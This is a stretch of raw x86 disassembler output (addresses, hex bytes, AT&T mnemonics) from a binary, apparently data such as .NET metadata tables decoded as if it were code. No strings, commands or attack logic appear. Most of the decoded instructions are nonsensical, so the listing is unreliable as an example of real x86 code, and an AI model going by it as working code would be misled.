  40420e:	10 2f                	adc    %ch,(%edi)
  404210:	00 00                	add    %al,(%eax)
  404212:	00 00                	add    %al,(%eax)
  404214:	91                   	xchg   %eax,%ecx
  404215:	00 fb                	add    %bh,%bl
  404217:	01 46 00             	add    %eax,0x0(%esi)
  40421a:	05 00 bc 33 00       	add    $0x33bc00,%eax
  40421f:	00 00                	add    %al,(%eax)
  404221:	00 91 00 0b 02 4b    	add    %dl,0x4b020b00(%ecx)
  404227:	00 06                	add    %al,(%esi)
  404229:	00 28                	add    %ch,(%eax)
  40422b:	37                   	aaa
  40422c:	00 00                	add    %al,(%eax)
  40422e:	00 00                	add    %al,(%eax)
  404230:	91                   	xchg   %eax,%ecx
  404231:	00 1c 02             	add    %bl,(%edx,%eax,1)
  404234:	4f                   	dec    %edi
  404235:	00 06                	add    %al,(%esi)
  404237:	00 4c 37 00          	add    %cl,0x0(%edi,%esi,1)
  40423b:	00 00                	add    %al,(%eax)
  40423d:	00 91 00 2a 02 55    	add    %dl,0x55022a00(%ecx)
  404243:	00 08                	add    %cl,(%eax)
  404245:	00 c0                	add    %al,%al
  404247:	37                   	aaa
  404248:	00 00                	add    %al,(%eax)
  40424a:	00 00                	add    %al,(%eax)
  40424c:	91                   	xchg   %eax,%ecx
  40424d:	00 35 02 5d 00 0a    	add    %dh,0xa005d02
  404253:	00 1c 38             	add    %bl,(%eax,%edi,1)
  404256:	00 00                	add    %al,(%eax)
  404258:	00 00                	add    %al,(%eax)
  40425a:	91                   	xchg   %eax,%ecx
  40425b:	00 43 02             	add    %al,0x2(%ebx)
  40425e:	62 00                	bound  %eax,(%eax)
  404260:	0a 00                	or     (%eax),%al
  404262:	04 3a                	add    $0x3a,%al
  404264:	00 00                	add    %al,(%eax)
  404266:	00 00                	add    %al,(%eax)
  404268:	91                   	xchg   %eax,%ecx
  404269:	00 51 02             	add    %dl,0x2(%ecx)
  40426c:	68 00 0c 00 d0       	push   $0xd0000c00
  404271:	3b 00                	cmp    (%eax),%eax
  404273:	00 00                	add    %al,(%eax)
  404275:	00 91 00 5c 02 6f    	add    %dl,0x6f025c00(%ecx)
  40427b:	00 0f                	add    %cl,(%edi)
  40427d:	00 50 20             	add    %dl,0x20(%eax)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 00                	add    %al,(%eax)
  404284:	91                   	xchg   %eax,%ecx
  404285:	00 3a                	add    %bh,(%edx)
  404287:	06                   	push   %es
  404288:	2a 01                	sub    (%ecx),%al
  40428a:	10 00                	adc    %al,(%eax)
  40428c:	ec                   	in     (%dx),%al
  40428d:	3c 00                	cmp    $0x0,%al
  40428f:	00 00                	add    %al,(%eax)
  404291:	00 91 18 7e 0d 3c    	add    %dl,0x3c0d7e18(%ecx)
  404297:	00 12                	add    %dl,(%edx)
  404299:	00 85 3d 00 00 00    	add    %al,0x3d(%ebp)
  40429f:	00 86 18 7c 02 74    	add    %al,0x74027c18(%esi)
  4042a5:	00 12                	add    %dl,(%edx)
  4042a7:	00 00                	add    %al,(%eax)
  4042a9:	00 00                	add    %al,(%eax)
  4042ab:	00 80 00 96 20 d7    	add    %al,-0x28df6a00(%eax)
  4042b1:	03 cd                	add    %ebp,%ecx
  4042b3:	00 12                	add    %dl,(%edx)
  4042b5:	00 00                	add    %al,(%eax)
  4042b7:	00 00                	add    %al,(%eax)
  4042b9:	00 80 00 96 20 e3    	add    %al,-0x1cdf6a00(%eax)
  4042bf:	03 d5                	add    %ebp,%edx
  4042c1:	00 16                	add    %dl,(%esi)
  4042c3:	00 00                	add    %al,(%eax)
  4042c5:	00 00                	add    %al,(%eax)
  4042c7:	00 80 00 96 20 f0    	add    %al,-0xfdf6a00(%eax)
  4042cd:	03 d5                	add    %ebp,%edx
  4042cf:	00 18                	add    %bl,(%eax)
  4042d1:	00 00                	add    %al,(%eax)
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 80 00 96 20 01    	add    %al,0x1209600(%eax)
  4042db:	04 da                	add    $0xda,%al
  4042dd:	00 1a                	add    %bl,(%edx)
  4042df:	00 00                	add    %al,(%eax)
  4042e1:	00 00                	add    %al,(%eax)
  4042e3:	00 80 00 96 20 14    	add    %al,0x14209600(%eax)
  4042e9:	04 d5                	add    $0xd5,%al
  4042eb:	00 1e                	add    %bl,(%esi)
  4042ed:	00 00                	add    %al,(%eax)
  4042ef:	00 00                	add    %al,(%eax)
  4042f1:	00 80 00 96 20 24    	add    %al,0x24209600(%eax)
  4042f7:	04 d5                	add    $0xd5,%al
  4042f9:	00 20                	add    %ah,(%eax)
  4042fb:	00 00                	add    %al,(%eax)
  4042fd:	00 00                	add    %al,(%eax)
  4042ff:	00 80 00 96 20 2d    	add    %al,0x2d209600(%eax)
  404305:	04 e2                	add    $0xe2,%al
  404307:	00 22                	add    %ah,(%edx)
  404309:	00 00                	add    %al,(%eax)
  40430b:	00 00                	add    %al,(%eax)
  40430d:	00 80 00 96 20 55    	add    %al,0x55209600(%eax)
  404313:	04 ea                	add    $0xea,%al
  404315:	00 25 00 00 00 00    	add    %ah,0x0
  40431b:	00 80 00 96 20 63    	add    %al,0x63209600(%eax)
  404321:	04 f2                	add    $0xf2,%al
  404323:	00 28                	add    %ch,(%eax)
  404325:	00 00                	add    %al,(%eax)
  404327:	00 00                	add    %al,(%eax)
  404329:	00 80 00 96 20 6f    	add    %al,0x6f209600(%eax)
  40432f:	04 f9                	add    $0xf9,%al
  404331:	00 2c 00             	add    %ch,(%eax,%eax,1)
  404334:	00 00                	add    %al,(%eax)
  404336:	00 00                	add    %al,(%eax)
  404338:	03 00                	add    (%eax),%eax
  40433a:	86 18                	xchg   %bl,(%eax)
  40433c:	7c 02                	jl     0x404340
  40433e:	01 01                	add    %eax,(%ecx)
  404340:	31 00                	xor    %eax,(%eax)
  404342:	00 00                	add    %al,(%eax)
  404344:	00 00                	add    %al,(%eax)
  404346:	03 00                	add    (%eax),%eax
  404348:	c6 01 91             	movb   $0x91,(%ecx)
  40434b:	04 07                	add    $0x7,%al
  40434d:	01 33                	add    %esi,(%ebx)
  40434f:	00 00                	add    %al,(%eax)
  404351:	00 00                	add    %al,(%eax)
  404353:	00 03                	add    %al,(%ebx)
  404355:	00 c6                	add    %al,%dh
  404357:	01 b3 04 0d 01 35    	add    %esi,0x35010d04(%ebx)
  40435d:	00 00                	add    %al,(%eax)
  40435f:	00 00                	add    %al,(%eax)
  404361:	00 03                	add    %al,(%ebx)
  404363:	00 c6                	add    %al,%dh
  404365:	01 bf 04 17 01 39    	add    %edi,0x39011704(%edi)
  40436b:	00 24 27             	add    %ah,(%edi,%eiz,1)
  40436e:	00 00                	add    %al,(%eax)
  404370:	00 00                	add    %al,(%eax)
  404372:	86 18                	xchg   %bl,(%eax)
  404374:	7c 02                	jl     0x404378
  404376:	74 00                	je     0x404378
  404378:	3a 00                	cmp    (%eax),%al
  40437a:	2c 27                	sub    $0x27,%al
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 00                	add    %al,(%eax)
  404380:	86 00                	xchg   %al,(%eax)
  404382:	9e                   	sahf
  404383:	08 07                	or     %al,(%edi)
  404385:	01 3a                	add    %edi,(%edx)
  404387:	00 4c 29 00          	add    %cl,0x0(%ecx,%ebp,1)
  40438b:	00 00                	add    %al,(%eax)
  40438d:	00 86 18 7c 02 74    	add    %al,0x74027c18(%esi)
  404393:	00 3c 00             	add    %bh,(%eax,%eax,1)
  404396:	54                   	push   %esp
  404397:	29 00                	sub    %eax,(%eax)
  404399:	00 00                	add    %al,(%eax)
  40439b:	00 86 00 12 09 48    	add    %al,0x48091200(%esi)
  4043a1:	02 3c 00             	add    (%eax,%eax,1),%bh
  4043a4:	f4                   	hlt
  4043a5:	32 00                	xor    (%eax),%al
  4043a7:	00 00                	add    %al,(%eax)
  4043a9:	00 86 18 7c 02 74    	add    %al,0x74027c18(%esi)
  4043af:	00 3d 00 fc 32 00    	add    %bh,0x32fc00
  4043b5:	00 00                	add    %al,(%eax)
  4043b7:	00 86 00 22 0c 07    	add    %al,0x70c2200(%esi)
  4043bd:	01 3d 00 00 00 01    	add    %edi,0x1000000
  4043c3:	00 c9                	add    %cl,%cl
  4043c5:	04 00                	add    $0x0,%al
  4043c7:	00 01                	add    %al,(%ecx)
  4043c9:	00 c9                	add    %cl,%cl
  4043cb:	04 00                	add    $0x0,%al
  4043cd:	00 01                	add    %al,(%ecx)
  4043cf:	00 ce                	add    %cl,%dh
  4043d1:	04 00                	add    $0x0,%al
  4043d3:	00 01                	add    %al,(%ecx)
  4043d5:	00 ce                	add    %cl,%dh
  4043d7:	04 00                	add    $0x0,%al
  4043d9:	00 01                	add    %al,(%ecx)
  4043db:	00 d2                	add    %dl,%dl
  4043dd:	04 00                	add    $0x0,%al
  4043df:	00 01                	add    %al,(%ecx)
  4043e1:	00 d7                	add    %dl,%bh
  4043e3:	04 00                	add    $0x0,%al
  4043e5:	00 02                	add    %al,(%edx)
  4043e7:	00 d9                	add    %bl,%cl
  4043e9:	04 00                	add    $0x0,%al
  4043eb:	00 01                	add    %al,(%ecx)
  4043ed:	00 db                	add    %bl,%bl
  4043ef:	04 00                	add    $0x0,%al
  4043f1:	00 02                	add    %al,(%edx)
  4043f3:	00 df                	add    %bl,%bh
  4043f5:	04 00                	add    $0x0,%al
  4043f7:	00 01                	add    %al,(%ecx)
  4043f9:	00 d2                	add    %dl,%dl
  4043fb:	04 00                	add    $0x0,%al
  4043fd:	00 02                	add    %al,(%edx)
  4043ff:	00 e7                	add    %ah,%bh
  404401:	04 00                	add    $0x0,%al
  404403:	00 01                	add    %al,(%ecx)
  404405:	00 d2                	add    %dl,%dl
  404407:	04 00                	add    $0x0,%al
  404409:	00 02                	add    %al,(%edx)
  40440b:	00 e7                	add    %ah,%bh
  40440d:	04 00                	add    $0x0,%al
  40440f:	00 03                	add    %al,(%ebx)
  404411:	00 eb                	add    %ch,%bl
  404413:	04 00                	add    $0x0,%al
  404415:	00 01                	add    %al,(%ecx)
  404417:	00 f4                	add    %dh,%ah
  404419:	04 00                	add    $0x0,%al
  40441b:	00 01                	add    %al,(%ecx)
  40441d:	00 45 06             	add    %al,0x6(%ebp)
  404420:	00 00                	add    %al,(%eax)
  404422:	02 00                	add    (%eax),%al
  404424:	4c                   	dec    %esp
  404425:	06                   	push   %es
  404426:	00 00                	add    %al,(%eax)
  404428:	01 00                	add    %eax,(%eax)
  40442a:	f6 04 00 00          	testb  $0x0,(%eax,%eax,1)
  40442e:	02 00                	add    (%eax),%al
  404430:	02 05 00 00 03 00    	add    0x30000,%al
  404436:	0a 05 00 00 04 00    	or     0x40000,%al
  40443c:	13 05 00 20 00 00    	adc    0x2000,%eax
  404442:	00 00                	add    %al,(%eax)
  404444:	00 00                	add    %al,(%eax)
  404446:	01 00                	add    %eax,(%eax)
  404448:	63 05 00 20 00 00    	arpl   %eax,0x2000
  40444e:	00 00                	add    %al,(%eax)
  404450:	00 00                	add    %al,(%eax)
  404452:	01 00                	add    %eax,(%eax)
  404454:	63 05 00 20 00 00    	arpl   %eax,0x2000
  40445a:	00 00                	add    %al,(%eax)
  40445c:	00 00                	add    %al,(%eax)
  40445e:	01 00                	add    %eax,(%eax)
  404460:	63 05 00 00 02 00    	arpl   %eax,0x20000
  404466:	6c                   	insb   (%dx),%es:(%edi)
  404467:	05 00 00 03 00       	add    $0x30000,%eax
  40446c:	71 05                	jno    0x404473
  40446e:	00 20                	add    %ah,(%eax)
  404470:	00 00                	add    %al,(%eax)
  404472:	00 00                	add    %al,(%eax)
  404474:	00 00                	add    %al,(%eax)
  404476:	01 00                	add    %eax,(%eax)
  404478:	78 05                	js     0x40447f
  40447a:	00 20                	add    %ah,(%eax)
  40447c:	00 00                	add    %al,(%eax)
  40447e:	00 00                	add    %al,(%eax)
  404480:	00 00                	add    %al,(%eax)
  404482:	01 00                	add    %eax,(%eax)
  404484:	78 05                	js     0x40448b
  404486:	00 20                	add    %ah,(%eax)
  404488:	00 00                	add    %al,(%eax)
  40448a:	00 00                	add    %al,(%eax)
  40448c:	00 00                	add    %al,(%eax)
  40448e:	01 00                	add    %eax,(%eax)
  404490:	78 05                	js     0x404497
  404492:	02 00                	add    (%eax),%al
  404494:	02 00                	add    (%eax),%al
  404496:	7d 05                	jge    0x40449d
  404498:	00 00                	add    %al,(%eax)
  40449a:	01 00                	add    %eax,(%eax)
  40449c:	78 05                	js     0x4044a3
  40449e:	00 00                	add    %al,(%eax)
  4044a0:	02 00                	add    (%eax),%al
  4044a2:	91                   	xchg   %eax,%ecx
  4044a3:	05 00 00 03 00       	add    $0x30000,%eax
  4044a8:	9a 05 00 20 00 00 00 	lcall  $0x0,$0x200005
  4044af:	00 00                	add    %al,(%eax)
  4044b1:	00 01                	add    %al,(%ecx)
  4044b3:	00 a4 05 00 00 02 00 	add    %ah,0x20000(%ebp,%eax,1)
  4044ba:	a9 05 00 00 03       	test   $0x3000005,%eax
  4044bf:	00 b0 05 00 20 00    	add    %dh,0x200005(%eax)
  4044c5:	00 00                	add    %al,(%eax)
  4044c7:	00 00                	add    %al,(%eax)
  4044c9:	00 01                	add    %al,(%ecx)
  4044cb:	00 78 05             	add    %bh,0x5(%eax)
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	02 00                	add    (%eax),%al
  4044d2:	b7 05                	mov    $0x5,%bh
  4044d4:	00 00                	add    %al,(%eax)
  4044d6:	03 00                	add    (%eax),%eax
  4044d8:	bb 05 00 00 04       	mov    $0x4000005,%ebx
  4044dd:	00 71 05             	add    %dh,0x5(%ecx)
  4044e0:	00 00                	add    %al,(%eax)
  4044e2:	01 00                	add    %eax,(%eax)
  4044e4:	c2 05 00             	ret    $0x5
  4044e7:	00 02                	add    %al,(%edx)
  4044e9:	00 c9                	add    %cl,%cl
  4044eb:	05 00 00 01 00       	add    $0x10000,%eax
  4044f0:	78 05                	js     0x4044f7
  4044f2:	00 00                	add    %al,(%eax)
  4044f4:	02 00                	add    (%eax),%al
  4044f6:	71 05                	jno    0x4044fd
  4044f8:	00 00                	add    %al,(%eax)
  4044fa:	01 00                	add    %eax,(%eax)
  4044fc:	78 05                	js     0x404503
  4044fe:	00 00                	add    %al,(%eax)
  404500:	02 00                	add    (%eax),%al
  404502:	71 05                	jno    0x404509
  404504:	00 00                	add    %al,(%eax)
  404506:	03 00                	add    (%eax),%eax
  404508:	d0 05 00 00 04 00    	rolb   $1,0x40000
  40450e:	c2 05 00             	ret    $0x5
  404511:	00 01                	add    %al,(%ecx)
  404513:	00 d9                	add    %bl,%cl
  404515:	05 00 00 01 00       	add    $0x10000,%eax
  40451a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40451b:	05 00 00 02 00       	add    $0x20000,%eax
  404520:	b5 08                	mov    $0x8,%ch
  404522:	00 00                	add    %al,(%eax)
  404524:	01 00                	add    %eax,(%eax)
  404526:	26 09 00             	or     %eax,%es:(%eax)
  404529:	00 01                	add    %al,(%ecx)
  40452b:	00 a4 05 00 00 02 00 	add    %ah,0x20000(%ebp,%eax,1)
  404532:	b5 08                	mov    $0x8,%ch
  404534:	59                   	pop    %ecx
  404535:	00 7c 02 1d          	add    %bh,0x1d(%edx,%eax,1)
  404539:	01 69 00             	add    %ebp,0x0(%ecx)
  40453c:	7c 02                	jl     0x404540
  40453e:	74 00                	je     0x404540
  404540:	71 00                	jno    0x404542
  404542:	7c 02                	jl     0x404546
  404544:	25 01 79 00 7c       	and    $0x7c007901,%eax
  404549:	02 74 00 91          	add    -0x6f(%eax,%eax,1),%dh
  40454d:	00 7c 02 74          	add    %bh,0x74(%edx,%eax,1)
  404551:	00 81 00 aa 06 35    	add    %al,0x3506aa00(%ecx)
  404557:	01 89 00 7c 02 01    	add    %ecx,0x1027c00(%ecx)
  40455d:	01 99 00 bd 06 3a    	add    %ebx,0x3a06bd00(%ecx)
  404563:	01 99 00 d0 06 46    	add    %ebx,0x4606d000(%ecx)
  404569:	00 99 00 d0 06 40    	add    %bl,0x4006d000(%ecx)
  40456f:	01 b1 00 7c 02 01    	add    %esi,0x1027c00(%ecx)
  404575:	01 b9 00 7c 02 47    	add    %edi,0x47027c00(%ecx)
  40457b:	01 b9 00 0a 07 35    	add    %edi,0x35070a00(%ecx)
  404581:	01 b9 00 1b 07 4d    	add    %edi,0x4d071b00(%ecx)
  404587:	01 b9 00 24 07 74    	add    %edi,0x74072400(%ecx)
  40458d:	00 b9 00 2a 07 52    	add    %bh,0x52072a00(%ecx)
  404593:	01 c1                	add    %eax,%ecx
  404595:	00 36                	add    %dh,(%esi)
  404597:	07                   	pop    %es
  404598:	5e                   	pop    %esi
  404599:	01 a1 00 42 07 64    	add    %esp,0x64074200(%ecx)
  40459f:	01 c9                	add    %ecx,%ecx
  4045a1:	00 52 07             	add    %dl,0x7(%edx)
  4045a4:	1b 00                	sbb    (%eax),%eax
  4045a6:	c9                   	leave
  4045a7:	00 36                	add    %dh,(%esi)
  4045a9:	07                   	pop    %es
  4045aa:	75 01                	jne    0x4045ad
  4045ac:	d1 00                	roll   $1,(%eax)
  4045ae:	5f                   	pop    %edi
  4045af:	07                   	pop    %es
  4045b0:	7b 01                	jnp    0x4045b3
  4045b2:	99                   	cltd
  4045b3:	00 d0                	add    %dl,%al
  4045b5:	06                   	push   %es
  4045b6:	7f 01                	jg     0x4045b9
  4045b8:	d9 00                	flds   (%eax)
  4045ba:	7a 07                	jp     0x4045c3
  4045bc:	85 01                	test   %eax,(%ecx)
  4045be:	d9 00                	flds   (%eax)
  4045c0:	83 07 89             	addl   $0xffffff89,(%edi)
  4045c3:	01 d9                	add    %ebx,%ecx
  4045c5:	00 97 07 8e 01 e1    	add    %dl,-0x1efe71f9(%edi)
  4045cb:	00 a6 07 97 01 e9    	add    %ah,-0x16fe68f9(%esi)
  4045d1:	00 bf 07 9b 01 e9    	add    %bh,-0x16fe64f9(%edi)
  4045d7:	00 c5                	add    %al,%ch
  4045d9:	07                   	pop    %es
  4045da:	a2 01 b9 00 ca       	mov    %al,0xca00b901
  4045df:	07                   	pop    %es
  4045e0:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4045e1:	01 f1                	add    %esi,%ecx
  4045e3:	00 d6                	add    %dl,%dh
  4045e5:	07                   	pop    %es
  4045e6:	ac                   	lods   %ds:(%esi),%al
  4045e7:	01 f1                	add    %esi,%ecx
  4045e9:	00 e0                	add    %ah,%al
  4045eb:	07                   	pop    %es
  4045ec:	ac                   	lods   %ds:(%esi),%al
  4045ed:	01 f1                	add    %esi,%ecx
  4045ef:	00 eb                	add    %ch,%bl
  4045f1:	07                   	pop    %es
  4045f2:	74 00                	je     0x4045f4
  4045f4:	39 00                	cmp    %eax,(%eax)
  4045f6:	7c 02                	jl     0x4045fa
  4045f8:	b0 01                	mov    $0x1,%al
  4045fa:	01 01                	add    %eax,(%ecx)
  4045fc:	08 08                	or     %cl,(%eax)
  4045fe:	b8 01 01 01 12       	mov    $0x12010101,%eax
  404603:	08 c0                	or     %al,%al
  404605:	01 01                	add    %eax,(%ecx)
  404607:	01 19                	add    %ebx,(%ecx)
  404609:	08 c4                	or     %al,%ah
  40460b:	01 09                	add    %ecx,(%ecx)
  40460d:	01 eb                	add    %ebp,%ebx
  40460f:	07                   	pop    %es
  404610:	74 00                	je     0x404612
  404612:	11 01                	adc    %eax,(%ecx)
  404614:	35 08 4f 00 19       	xor    $0x19004f08,%eax
  404619:	01 43 08             	add    %eax,0x8(%ebx)
  40461c:	c9                   	leave
  40461d:	01 c1                	add    %eax,%ecx
  40461f:	00 4f 08             	add    %cl,0x8(%edi)
  404622:	62 00                	bound  %eax,(%eax)
  404624:	c9                   	leave
  404625:	00 56 08             	add    %dl,0x8(%esi)
  404628:	75 01                	jne    0x40462b
  40462a:	09 00                	or     %eax,(%eax)
  40462c:	7c 02                	jl     0x404630
  40462e:	74 00                	je     0x404630
  404630:	41                   	inc    %ecx
  404631:	00 7c 02 25          	add    %bh,0x25(%edx,%eax,1)
  404635:	01 41 00             	add    %eax,0x0(%ecx)
  404638:	b7 08                	mov    $0x8,%bh
  40463a:	ac                   	lods   %ds:(%esi),%al
  40463b:	01 09                	add    %ecx,(%ecx)
  40463d:	00 c4                	add    %al,%ah
  40463f:	08 c9                	or     %cl,%cl
  404641:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  404644:	cd 08                	int    $0x8
  404646:	02 02                	add    (%edx),%al
  404648:	0c 00                	or     $0x0,%al
  40464a:	7c 02                	jl     0x40464e
  40464c:	74 00                	je     0x40464e
  40464e:	0c 00                	or     $0x0,%al
  404650:	dc 08                	fmull  (%eax)
  404652:	16                   	push   %ss
  404653:	02 14 00             	add    (%eax,%eax,1),%dl
  404656:	ea 08 28 02 14 00 f6 	ljmp   $0xf600,$0x14022808
  40465d:	08 2d 02 31 01 7c    	or     %ch,0x7c013102
  404663:	02 74 00 31          	add    0x31(%eax,%eax,1),%dh
  404667:	01 57 09             	add    %edx,0x9(%edi)
  40466a:	4d                   	dec    %ebp
  40466b:	02 c1                	add    %cl,%al
  40466d:	00 4f 08             	add    %cl,0x8(%edi)
  404670:	53                   	push   %ebx
  404671:	02 39                	add    (%ecx),%bh
  404673:	01 cd                	add    %ecx,%ebp
  404675:	08 4d 01             	or     %cl,0x1(%ebp)
  404678:	31 01                	xor    %eax,(%ecx)
  40467a:	24 07                	and    $0x7,%al
  40467c:	74 00                	je     0x40467e
  40467e:	31 01                	xor    %eax,(%ecx)
  404680:	64 09 5a 02          	or     %ebx,%fs:0x2(%edx)
  404684:	41                   	inc    %ecx
  404685:	01 7c 02 01          	add    %edi,0x1(%edx,%eax,1)
  404689:	01 49 01             	add    %ecx,0x1(%ecx)
  40468c:	87 09                	xchg   %ecx,(%ecx)
  40468e:	5f                   	pop    %edi
  40468f:	02 31                	add    (%ecx),%dh
  404691:	01 99 09 74 00 31    	add    %ebx,0x31007409(%ecx)
  404697:	00 e1                	add    %ah,%cl
  404699:	09 6f 02             	or     %ebp,0x2(%edi)
  40469c:	61                   	popa
  40469d:	01 f1                	add    %esi,%ecx
  40469f:	09 75 02             	or     %esi,0x2(%ebp)
  4046a2:	69 01 f9 09 c9 01    	imul   $0x1c909f9,(%ecx),%eax
  4046a8:	61                   	popa
  4046a9:	01 0a                	add    %ecx,(%edx)
  4046ab:	0a c9                	or     %cl,%cl
  4046ad:	01 71 01             	add    %esi,0x1(%ecx)
  4046b0:	22 0a                	and    (%edx),%cl
  4046b2:	7b 02                	jnp    0x4046b6
  4046b4:	71 01                	jno    0x4046b7
  4046b6:	2b 0a                	sub    (%edx),%ecx
  4046b8:	81 02 31 00 49 0a    	addl   $0xa490031,(%edx)
  4046be:	87 02                	xchg   %eax,(%edx)
  4046c0:	79 01                	jns    0x4046c3
  4046c2:	56                   	push   %esi
  4046c3:	0a 25 01 79 01 65    	or     0x65017901,%ah
  4046c9:	0a 4d 01             	or     0x1(%ebp),%cl
  4046cc:	79 01                	jns    0x4046cf
  4046ce:	75 0a                	jne    0x4046da
  4046d0:	8d 02                	lea    (%edx),%eax
  4046d2:	79 01                	jns    0x4046d5
  4046d4:	9a 0a 92 02 81 01 ab 	lcall  $0xab01,$0x8102920a
  4046db:	0a 98 02 81 01 99    	or     -0x66fe7efe(%eax),%bl
  4046e1:	09 74 00 61          	or     %esi,0x61(%eax,%eax,1)
  4046e5:	01 b1 0a 92 02 61    	add    %esi,0x6102920a(%ecx)
  4046eb:	01 c1                	add    %eax,%ecx
  4046ed:	0a a0 02 89 01 7c    	or     0x7c018902(%eax),%ah
  4046f3:	02 a6 02 91 01 ed    	add    -0x12fe6efe(%esi),%ah
  4046f9:	0a c9                	or     %cl,%cl
  4046fb:	01 79 01             	add    %edi,0x1(%ecx)
  4046fe:	f7 0a 35 01 79 01    	testl  $0x1790135,(%edx)
  404704:	1b 0b                	sbb    (%ebx),%ecx
  404706:	bf 02 a1 01 cd       	mov    $0xcd01a102,%edi
  40470b:	08 c5                	or     %al,%ch
  40470d:	02 09                	add    (%ecx),%cl
  40470f:	00 5a 0b             	add    %bl,0xb(%edx)
  404712:	cb                   	lret
  404713:	02 71 01             	add    0x1(%ecx),%dh
  404716:	6a 0b                	push   $0xb
  404718:	7b 02                	jnp    0x40471c
  40471a:	81 01 74 0b d1 02    	addl   $0x2d10b74,(%ecx)
  404720:	81 01 7e 0b 74 00    	addl   $0x740b7e,(%ecx)
  404726:	c1 00 84             	roll   $0x84,(%eax)
  404729:	0b e9                	or     %ecx,%ebp
  40472b:	02 1c 00             	add    (%eax,%eax,1),%bl
  40472e:	7c 02                	jl     0x404732
  404730:	25 01 1c 00 cd       	and    $0xcd001c01,%eax
  404735:	08 ff                	or     %bh,%bh
  404737:	02 1c 00             	add    (%eax,%eax,1),%bl
  40473a:	f8                   	clc
  40473b:	0b 07                	or     (%edi),%eax
  40473d:	03 c9                	add    %ecx,%ecx
  40473f:	00 7c 02 25          	add    %bh,0x25(%edx,%eax,1)
  404743:	01 c1                	add    %eax,%ecx
  404745:	00 04 0c             	add    %al,(%esp,%ecx,1)
  404748:	10 03                	adc    %al,(%ebx)
  40474a:	41                   	inc    %ecx
  40474b:	00 3a                	add    %bh,(%edx)
  40474d:	0c 3b                	or     $0x3b,%al
  40474f:	03 c9                	add    %ecx,%ecx
  404751:	00 c4                	add    %al,%ah
  404753:	08 41 03             	or     %al,0x3(%ecx)
  404756:	41                   	inc    %ecx
  404757:	00 3a                	add    %bh,(%edx)
  404759:	0c 46                	or     $0x46,%al
  40475b:	03 b1 01 62 0c 4c    	add    0x4c0c6201(%ecx),%esi
  404761:	03 b9 01 c4 08 52    	add    0x5208c401(%ecx),%edi
  404767:	03 0c 00             	add    (%eax,%eax,1),%ecx
  40476a:	8e 0c 5a             	mov    (%edx,%ebx,2),%cs
  40476d:	03 0c 00             	add    (%eax,%eax,1),%ecx
  404770:	97                   	xchg   %eax,%edi
  404771:	0c ac                	or     $0xac,%al
  404773:	01 c9                	add    %ecx,%ecx
  404775:	01 7c 02 25          	add    %edi,0x25(%edx,%eax,1)
  404779:	01 d1                	add    %edx,%ecx
  40477b:	01 7c 02 25          	add    %edi,0x25(%edx,%eax,1)
  40477f:	01 d1                	add    %edx,%ecx
  404781:	01 d1                	add    %edx,%ecx
  404783:	0c 7b                	or     $0x7b,%al
  404785:	03 e1                	add    %ecx,%esp
  404787:	01 e3                	add    %esp,%ebx
  404789:	0c 82                	or     $0x82,%al
  40478b:	03 d9                	add    %ecx,%ebx
  40478d:	01 7c 02 87          	add    %edi,-0x79(%edx,%eax,1)
  404791:	03 f1                	add    %ecx,%esi
  404793:	00 eb                	add    %ch,%bl
  404795:	0c 8f                	or     $0x8f,%al
  404797:	03 d1                	add    %ecx,%edx
  404799:	01 eb                	add    %ebp,%ebx
  40479b:	07                   	pop    %es
  40479c:	74 00                	je     0x40479e
  40479e:	c9                   	leave
  40479f:	01 f0                	add    %esi,%eax
  4047a1:	0c 9b                	or     $0x9b,%al
  4047a3:	03 29                	add    (%ecx),%ebp
  4047a5:	00 f8                	add    %bh,%al
  4047a7:	0c ac                	or     $0xac,%al
  4047a9:	03 29                	add    (%ecx),%ebp
  4047ab:	00 09                	add    %cl,(%ecx)
  4047ad:	0d c9 01 c1 00       	or     $0xc101c9,%eax
  4047b2:	27                   	daa
  4047b3:	0d b2 03 c1 00       	or     $0xc103b2,%eax
  4047b8:	4f                   	dec    %edi
  4047b9:	08 ca                	or     %cl,%dl
  4047bb:	03 c1                	add    %ecx,%eax
  4047bd:	00 2e                	add    %ch,(%esi)
  4047bf:	0d d1 03 c1 00       	or     $0xc103d1,%eax
  4047c4:	36 0d ac 01 c1 00    	ss or  $0xc101ac,%eax
  4047ca:	2e 0d d9 03 f1 01    	cs or  $0x1f103d9,%eax
  4047d0:	46                   	inc    %esi
  4047d1:	0d df 03 41 00       	or     $0x4103df,%eax
  4047d6:	7c 02                	jl     0x4047da
  4047d8:	74 00                	je     0x4047da
  4047da:	41                   	inc    %ecx
  4047db:	00 3a                	add    %bh,(%edx)
  4047dd:	0c e4                	or     $0xe4,%al
  4047df:	03 f1                	add    %ecx,%esi
  4047e1:	01 53 0d             	add    %edx,0xd(%ebx)
  4047e4:	df 03                	filds  (%ebx)
  4047e6:	c1 00 5b             	roll   $0x5b,(%eax)
  4047e9:	0d f6 03 b9 01       	or     $0x1b903f6,%eax
  4047ee:	42                   	inc    %edx
  4047ef:	07                   	pop    %es
  4047f0:	fc                   	cld
  4047f1:	03 11                	add    (%ecx),%edx
  4047f3:	01 72 0d             	add    %esi,0xd(%edx)
  4047f6:	09 04 c1             	or     %eax,(%ecx,%eax,8)
  4047f9:	00 78 0d             	add    %bh,0xd(%eax)
  4047fc:	12 00                	adc    (%eax),%al
  4047fe:	a1 00 c4 08 41       	mov    0x4108c400,%eax
  404803:	03 09                	add    (%ecx),%ecx
  404805:	02 7c 02 4d          	add    0x4d(%edx,%eax,1),%bh
  404809:	01 11                	add    %edx,(%ecx)
  40480b:	02 7c 02 24          	add    0x24(%edx,%eax,1),%bh
  40480f:	04 08                	add    $0x8,%al
  404811:	00 58 00             	add    %bl,0x0(%eax)
  404814:	78 00                	js     0x404816
  404816:	08 00                	or     %al,(%eax)
  404818:	5c                   	pop    %esp
  404819:	00 7d 00             	add    %bh,0x0(%ebp)
  40481c:	08 00                	or     %al,(%eax)
  40481e:	60                   	pusha
  40481f:	00 82 00 08 00 64    	add    %al,0x64000800(%edx)
  404825:	00 87 00 08 00 68    	add    %al,0x68000800(%edi)
  40482b:	00 8c 00 08 00 6c 00 	add    %cl,0x6c0008(%eax,%eax,1)
  404832:	91                   	xchg   %eax,%ecx
  404833:	00 08                	add    %cl,(%eax)
  404835:	00 70 00             	add    %dh,0x0(%eax)
  404838:	96                   	xchg   %eax,%esi
